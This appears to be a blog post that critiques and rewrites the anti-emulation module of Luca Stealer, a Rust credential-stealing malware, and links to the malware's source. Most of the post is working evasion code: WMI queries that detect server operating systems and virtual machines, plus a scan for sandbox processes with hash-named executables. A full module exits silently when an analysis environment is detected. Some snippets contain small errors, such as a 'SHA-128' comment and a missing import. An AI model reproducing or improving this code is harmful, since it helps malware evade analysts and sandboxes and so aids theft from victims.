---
title: 'Luca stealer - how to fuck up your code (part 1; anti-emulation)'
description: 'When you fuck up your code real bad, posts like this happen...'
pubDate: 'Jul 08 2024'
heroImage: '/blog-image-1.jpg'
---

Howdy y'all, this is my first (and probably) last series of blog posts, but I had to type this out, considering how fucking retarded [the code for Luca Stealer](https://github.com/vxunderground/MalwareSourceCode/blob/main/Win32/Stealers/Win32.Rust.LucaStealer.zip) is. This post is about the anti-emulation.

##### Disclaimer: the code provided here shall not be used maliciously, and is for old versions of the crates talked about. I'm also not adding async/await, as I have other things to do and it'd take too much work for my lazy dum dum ADHD brain.
<br />

### The detect function

We're starting with the detect function:
```
pub fn detect()  {
	if is_server_os() || is_vm_by_wim_temper() || detect_hash_processes() {
		process::exit(0);
	}
}
```

Surprisingly, this part is actually pretty good. But instead, I'd let the users select what functions they want. For example (this code was written in 2 minutes):

```
enum Mode {
	#[allow(non_camel_case_types)]
	ANTI_SERVER,
	#[allow(non_camel_case_types)]
	WIM_TEMPER,
	#[allow(non_camel_case_types)]
	DETECT_HASH_PROCESSES
}

const MODES: &[Mode] = &[ANTI_SERVER, WIM_TEMPER, DETECT_HASH_PROCESSES];

pub fn is_vm() -> bool {
	MODES.map(|mode| match mode {
		ANTI_SERVER => is_server_os(),
		WIM_TEMPER => is_vm_by_wim_temper(),
		DETECT_HASH_PROCESSES => detect_hash_processes()
	}).fold(false, |init, acc| init || acc)
}
```
And then the  ```process::exit(0)``` goes in main.
You could probably spend some more time to use function pointers for less friction while coding and/or configuring, but this is just the start, and I'm not spending an hour improving a 5 line function for a silly blog post.

### Server OS detection
Now let's dive into the real deal, starting with the server OS detection function.

```
fn is_server_os() -> bool {
	let hostname = whoami::hostname();
	let namespace_path = format!("{}{}", hostname, obfstr::obfstr!("\\ROOT\\CIMV2"));
	let wmi_con = match WMIConnection::with_namespace_path(&namespace_path, COMLibrary::new().unwrap().into()) {
		Ok(wmi_con) => wmi_con,
		Err(_) => return false,
	};

	let results: Vec<HashMap<String, Variant>> = wmi_con
		.raw_query(obfstr::obfstr!("SELECT ProductType FROM Win32_OperatingSystem"))
		.unwrap();

	drop(wmi_con);

	for result in results {
		for value in result.values()  {
			if *value == Variant::UI4(2) || *value == Variant::UI4(3) {
				return true;
			}
		}
	}

	false
}
```

...I have no words for how stupid this is. These variable names are too complex, he barely uses any rust functions, and is making variables when he doesn't need them.

Starting with namespace path and hostname, the functions describe themselves, so you don't need to make them a variable. Also, "wmi_con" could be renamed to the better name, "connection". You don't even need match, you can use the let-else syntax, stable since Rust 1.65.

I also dislike the way results was made (unwrap, use let-else once again), but I don't have much experience with that part, so I might leave it alone for the most part. You could also save a character and make the code cleaner by changing the "\\ROOT\\CIMv2" to r"\ROOT\CIMv2".

My finished product is this:
```
fn is_server_os() -> bool {
	let Ok(library) = COMLibrary::new() else {
		return false;
	};
	
	let Ok(connection) = WMIConnection::with_namespace_path(&format!("{}{}", whoami::hostname(), obfstr::obfstr!(r"\ROOT\CIMV2")), library.into()) else {
		return false;
	};

	let Ok(results) = connection.raw_query(obfstr::obfstr!("SELECT ProductType FROM Win32_OperatingSystem")) else {
		return false;
	};

	drop(connection);

	for result in results {
		for value in result.values()  {
			if *value == Variant::UI4(2) || *value == Variant::UI4(3) {
				return true;
			}
		}
	}

	false
}
```
</br>

### Hash process detection
Moving on, let's talk about the hash process detection.
The code goes like this:

```
fn detect_hash_processes() -> bool  {
	let mut system = System::new();
	system.refresh_all();

	for (_,  process) in system.processes() {
		if let Some(arg) = process.cmd().get(0) {
			let path = Path::new(arg);
			
			match path.file_stem() {
				Some(file_name) => {
					if file_name.len() == 64 || file_name.len() == 128 {
						return  true; // MD5 Or SHA-512
					}
				},
				None  =>  (),
			}
		}
	}
	
	false
}
```

How much time did you take writing this and/or learning rust... 2 seconds? There's so much to improve:

- Don't refresh all, make a system with processes refreshed
- Don't use get(0), use first()
- Rename arg to path
- Use map and Path::new to create the path
- Instead of "file_name", name the variable just "name"
- Use let-some and continue to reduce nesting
- Use if_some_and instead of match... are you addicted to match or..?

My finished product is this:

```
fn detect_hash_processes() -> bool  {
	let mut system = System::new_with_specifics(
		RefreshKind::new().with_processes(ProcessRefreshKind::everything())
	);

	for (_,  process) in system.processes()  {
		let Some(path) = process.cmd().first().map(Path::new) else {
			continue;
		};

		if path
			.file_stem()
			.is_some_and(|name| name.len() == 64 || name.len() == 128) // MD5 OR SHA-128
		{
			return true;
		}
	}

	false
}
```
</br>

### Detection by WIM temper
Finally, I'm tired of writing, and by chance, this file just has one last function:

```
fn is_vm_by_wim_temper() -> bool {
	let wmi_con = WMIConnection::new(COMLibrary::new().unwrap().into()).unwrap();  

	let results: Vec<HashMap<String, Variant>> = wmi_con
		.raw_query(obfstr::obfstr!("SELECT * FROM Win32_CacheMemory"))
		.unwrap();

	drop(wmi_con);

	if results.len() < 2 {
		return true;
	}

	false
}
```

Everything that I hate in this function I've already talked about, so let's cut the chase and finish this rewrite.

```
fn is_vm_by_wim_temper() -> bool {
	let Ok(library) = COMLibrary::new() else {
		return false;
	};

	let Ok(connection) = WMIConnection::new(library.into()) else {
		return false;
	};

	let Ok(results) = connection.raw_query(obfstr!("SELECT * FROM Win32_CacheMemory")) else {
		return false;
	};

	drop(connection);

	if results.len() < 2 {
		return true;
	}

	false
}
```

What we learned today: rust is our friend, and you don't code in rust like you code in other languages; add more customizability without repetition; for the love of god, don't specify everything in your variable names.

### Full code

Here's the full code, which at the end of the series, might also be posted on github:
```
use obfstr::obfstr;
use std::{collections::HashMap, path::Path, process};
use sysinfo::System;
use wmi::{COMLibrary, Variant, WMIConnection}; // Added this here because typing it 2 times is tiring

enum Mode {
    #[allow(non_camel_case_types)]
    ANTI_SERVER,
    #[allow(non_camel_case_types)]
    WIM_TEMPER,
    #[allow(non_camel_case_types)]
    DETECT_HASH_PROCESSES,
}

const MODES: &[Mode] = &[ANTI_SERVER, WIM_TEMPER, DETECT_HASH_PROCESSES];

pub fn is_vm() -> bool {
    MODES
        .map(|mode| match mode {
            ANTI_SERVER => is_server_os(),
            WIM_TEMPER => is_vm_by_wim_temper(),
            DETECT_HASH_PROCESSES => detect_hash_processes(),
        })
        .fold(false, |init, acc| init || acc)
}

// This function wasn't in my write-up for reasons I've already described, I've added it only for compatibility
pub fn detect() {
    if is_vm() {
        process::exit(0);
    }
}

fn is_server_os() -> bool {
    let Ok(library) = COMLibrary::new() else {
        return false;
    };

    let Ok(connection) = WMIConnection::with_namespace_path(
        &format!("{}{}", whoami::hostname(), obfstr!(r"\ROOT\CIMV2")),
        library.into(),
    ) else {
        return false;
    };

    let Ok(results) =
        connection.raw_query(obfstr!("SELECT ProductType FROM Win32_OperatingSystem"))
    else {
        return false;
    };

    drop(connection);

    for result in results {
        for value in result.values() {
            if *value == Variant::UI4(2) || *value == Variant::UI4(3) {
                return true;
            }
        }
    }

    false
}

fn detect_hash_processes() -> bool {
    let mut system = System::new_with_specifics(
        RefreshKind::new().with_processes(ProcessRefreshKind::everything()),
    );

    for (_, process) in system.processes() {
        let Some(path) = process.cmd().first().map(Path::new) else {
            continue;
        };

        if path
            .file_stem()
            .is_some_and(|name| name.len() == 64 || name.len() == 128)
        {
            return true;
        }
    }

    false
}

fn is_vm_by_wim_temper() -> bool {
    let Ok(library) = COMLibrary::new() else {
        return false;
    };

    let Ok(connection) = WMIConnection::new(library.into()) else {
        return false;
    };

    let Ok(results) = connection.raw_query(obfstr!("SELECT * FROM Win32_CacheMemory")) else {
        return false;
    };

    drop(connection);

    if results.len() < 2 {
        return true;
    }

    false
}
```

</br>

I might continue this if I get some traction and/or friends in Session.